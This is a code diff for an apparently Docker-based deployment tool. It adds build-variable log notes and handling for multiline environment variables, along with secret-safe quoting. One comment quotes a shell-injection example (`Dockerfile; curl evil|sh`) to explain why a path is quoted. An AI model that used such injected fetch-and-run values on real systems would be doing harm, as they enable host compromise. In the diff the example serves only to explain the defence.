@@ -1061,6 +1061,7 @@ function prepSteps(app: AppSpec, version: string, noCache = false): string[] {
         `case "$TUGRA_BASE/" in "$TUGRA_BD"/*) ;; *) echo "TUGRA: base directory resolves outside the repository"; exit 1;; esac`,
       );
     }
+    steps.push(...buildFlagNote(app));
     if (app.buildType === "DOCKERFILE") {
       // shq the -f path: dockerfilePath is caller/importer-supplied; unquoted it was a host-root shell
       // injection (e.g. `Dockerfile; curl evil|sh`). The `--` before each clone URL likewise stops a
@@ -1224,17 +1225,60 @@ export function envFileB64(env: Record<string, string>, b64Keys?: ReadonlySet<st
  * `build=true` (normal deploy) produces the versioned image first; `build=false`
  * (rollback) skips all prep and just runs the pre-existing versioned tag.
  */
+/**
+ * Build-log notes for the per-variable Build time flag (GIT builds only; empty - byte-identical - when no variable
+ * carries it). Key NAMES only, never values. The flagged values themselves already ride `spec.buildArgs`, so the
+ * existing `--build-arg` (Dockerfile/static) or `--env` (nixpacks/railpack/pack) emission applies unchanged.
+ */
+function buildFlagNote(app: AppSpec): string[] {
+  const keys = app.buildFlagKeys ?? [];
+  const dropped = app.buildFlagDropped ?? [];
+  if (keys.length === 0 && dropped.length === 0) return [];
+  const out: string[] = [];
+  if (keys.length) {
+    out.push(`echo ${shq(`TUGRA_BUILD_ENV: ${keys.length} variable(s) passed to the build (Build time flag): ${keys.join(", ")}`)}`);
+    if (app.buildType === "DOCKERFILE" || app.buildType === "STATIC") {
+      const sensitive = keys.filter(looksSensitiveKey);
+      if (sensitive.length) {
+        out.push(`echo ${shq(`TUGRA: WARNING - build variables are baked into the image history (docker history); use Build secrets for secrets: ${sensitive.join(", ")}`)}`);
+      }
+    }
+  }
+  for (const k of dropped) out.push(`echo ${shq(`TUGRA: build variable ${k} ignored - a build secret with the same name exists`)}`);
+  return out;
+}
+
 /** Write the app's secrets to a 0600 --env-file (empty when there are no env vars).
  *  Secrets go through a file, never -e, so they never hit the process list. */
 function envPreludeFor(app: AppSpec): string[] {
   const env = app.env && typeof app.env === "object" ? app.env : {};
   if (Object.keys(env).length === 0) return [];
-  const envPath = envFilePath(app);
-  return [
-    `mkdir -p ${ENV_DIR}`,
-    `printf %s ${shq(envFileB64(env))} | base64 -d > ${envPath}`,
-    `chmod 600 ${envPath}`,
-  ];
+  const plan = planEnv(env, app.envMeta, "docker");
+  const lines: string[] = [];
+  if (Object.keys(plan.fileEnv).length > 0) {
+    const envPath = envFilePath(app);
+    lines.push(`mkdir -p ${ENV_DIR}`, `printf %s ${shq(envFileB64(plan.fileEnv))} | base64 -d > ${envPath}`, `chmod 600 ${envPath}`);
+  }
+  // Multiline values never ride the env file: decoded into UNEXPORTED shell variables and attached to the one
+  // `docker run` by scoped prefix assignment (see env-render).
+  lines.push(...mlPrelude(plan.shell));
+  return lines;
+}
+
+/** `--env-file <path>` for the file-borne env plus `-e KEY` (by name; the value comes from the docker CLI's own
+ *  process environment) for each multiline variable; '' when there is no env at all. */
+function envRunFlags(app: AppSpec): { flags: string; prefix: string; shell: boolean } {
+  const env = app.env && typeof app.env === "object" ? app.env : {};
+  const plan = planEnv(env, app.envMeta, "docker");
+  const flags = [Object.keys(plan.fileEnv).length > 0 ? `--env-file ${envFilePath(app)}` : "", mlEnvFlags(plan.shell)].filter(Boolean).join(" ");
+  return { flags, prefix: mlPrefix(plan.shell), shell: plan.shell.length > 0 };
+}
+
+/** The script travels as ONE `bash -c` argument; a multiline value is base64-embedded in it, so fail early and
+ *  clearly (only when that transport is in use: an unflagged oversize env keeps today's behaviour). */
+function fitIfMultiline(app: AppSpec, script: string): string {
+  if (app.envMeta && Object.values(app.envMeta).some((f) => f.multiline)) assertScriptFits(script);
+  return script;
 }
 
 /** Ensure every network the container joins exists before it does (idempotent; tolerates a pruned or
@@ -1362,8 +1406,7 @@ function sourceCommitRunToken(app: AppSpec): string {
 
 function runContainerArgs(app: AppSpec, version: string, name: string): string {
   const ref = runTag(app, version);
-  const env = app.env && typeof app.env === "object" ? app.env : {};
-  const envArg = Object.keys(env).length > 0 ? `--env-file ${envFilePath(app)}` : "";
+  const { flags: envArg, prefix: envPrefix } = envRunFlags(app);
 
   const plan = appNetworkPlan(app);
   let netExpose: string;
@@ -1460,7 +1503,7 @@ function runContainerArgs(app: AppSpec, version: string, name: string): string {
 
   const retries = app.restartPolicy === "on-failure" ? boundedInt(app.restartMaxRetries, 1, 1000) : null;
   const run = [
-    "docker run -d",
+    `${envPrefix}docker run -d`,
     `--name ${name}`,
     // Null → "unless-stopped" (byte-identical). Enum value (DTO-validated) → shell-safe without quoting.
     `--restart ${app.restartPolicy ?? "unless-stopped"}${retries ? ":" + retries : ""}`,
@@ -1508,8 +1551,7 @@ function runContainerArgs(app: AppSpec, version: string, name: string): string {
  *  named/host volumes. Deliberately NOT the --name/-p/labels/--restart/health/dockerOptions of the live
  *  container — the hook is a throwaway job, not a second copy of the app in rotation. */
 function preDeployContainerArgs(app: AppSpec): string {
-  const env = app.env && typeof app.env === "object" ? app.env : {};
-  const envArg = Object.keys(env).length > 0 ? `--env-file ${envFilePath(app)}` : "";
+  const { flags: envArg } = envRunFlags(app);
   // The managed-DB net when db-linked, else the app's first user network (so a migration can reach its database;
   // `docker run` takes one --network on any engine). Never tugra-apps; none when a raw --network is set.
   const net = app.dbNetwork
@@ -1537,7 +1579,7 @@ function preDeploySteps(app: AppSpec, version: string): string[] {
   const ref = runTag(app, version);
   return [
     `echo "TUGRA_PREDEPLOY: running"`,
-    `if docker run --rm ${args ? args + " " : ""}--entrypoint sh ${shq(ref)} -c ${shq(cmd)}; then echo "TUGRA_PREDEPLOY: ok"; else echo "TUGRA_PREDEPLOY: failed"; exit 1; fi`,
+    `if ${envRunFlags(app).prefix}docker run --rm ${args ? args + " " : ""}--entrypoint sh ${shq(ref)} -c ${shq(cmd)}; then echo "TUGRA_PREDEPLOY: ok"; else echo "TUGRA_PREDEPLOY: failed"; exit 1; fi`,
   ];
 }
 
@@ -1562,7 +1604,7 @@ export function buildPostDeployScript(app: AppSpec): string {
 export function buildRunScript(app: AppSpec, version: string, build = true, noCache = false): string {
   const name = containerName(app);
   const ref = runTag(app, version);
-  return [
+  return fitIfMultiline(app, [
     "set -e",
     ...(build ? prepSteps(app, version, noCache) : []),
     ...envPreludeFor(app),
@@ -1581,7 +1623,7 @@ export function buildRunScript(app: AppSpec, version: string, build = true, noCa
     `docker rm -f ${name} 2>/dev/null || true`, // still the guaranteed remover
     runContainerArgs(app, version, name),
     `docker ps --filter name=${name} --format '{{.Status}}'`,
-  ].join("\n");
+  ].join("\n"));
 }
 
 /** Graceful stop before the hard `rm -f` of a container about to be replaced, honouring the app's grace window.
@@ -1850,7 +1892,7 @@ export function buildRollingDeployScript(
             "  fi",
           ]
         : [];
-    return [
+    return fitIfMultiline(app, [
       ...head,
       `if [ "$healthy" = 1 ]; then`,
       ...drainLines("  "),
@@ -1861,7 +1903,7 @@ export function buildRollingDeployScript(
       // the temp name and every lifecycle command (stop/start/logs) would miss it.
       `  if docker rename ${rollout} ${canonical}; then echo "TUGRA_ROLLOUT: healthy"; exit 0; else echo "TUGRA_ROLLOUT: rename_failed"; exit 1; fi`,
       ...gateFailBranch,
-    ].join("\n");
+    ].join("\n"));
   }
 
   // --- Post-cutover soak path (opts.soak.windowSec > 0) --------------------------------------------------
@@ -1880,7 +1922,7 @@ export function buildRollingDeployScript(
           `  fi`,
         ]
       : [`  if docker rename ${rollout} ${canonical}; then :; else echo "TUGRA_ROLLOUT: rename_failed"; exit 1; fi`];
-  return [
+  return fitIfMultiline(app, [
     ...head,
     `if [ "$healthy" = 1 ]; then`,
     ...drainLines("  "),
@@ -1912,7 +1954,7 @@ export function buildRollingDeployScript(
     `    fi`,
     `  fi`,
     ...gateFailBranch,
-  ].join("\n");
+  ].join("\n"));
 }
 
 /**
@@ -1944,7 +1986,7 @@ export function buildRecreateDeployScript(
   const rollback = opts.prevVersion
     ? `  if ${runContainerArgs(prevApp, opts.prevVersion, canonical)}; then echo "TUGRA_ROLLOUT: rolled_back"; exit 3; else echo "TUGRA_ROLLOUT: rollback_failed"; exit 1; fi`
     : `  echo "TUGRA_ROLLOUT: failed"; exit 1`;
-  return [
+  return fitIfMultiline(app, [
     "set -e",
     ...(build ? prepSteps(app, version, opts.noCache ?? false) : []),
     ...envPreludeFor(app),
@@ -1969,7 +2011,7 @@ export function buildRecreateDeployScript(
     `  docker rm -f ${canonical} 2>/dev/null || true`, // drop the unhealthy/failed new container
     rollback,
     "fi",
-  ].join("\n");
+  ].join("\n"));
 }
 
 /** Remove a versioned image by deriving its tag from the deployment id. */
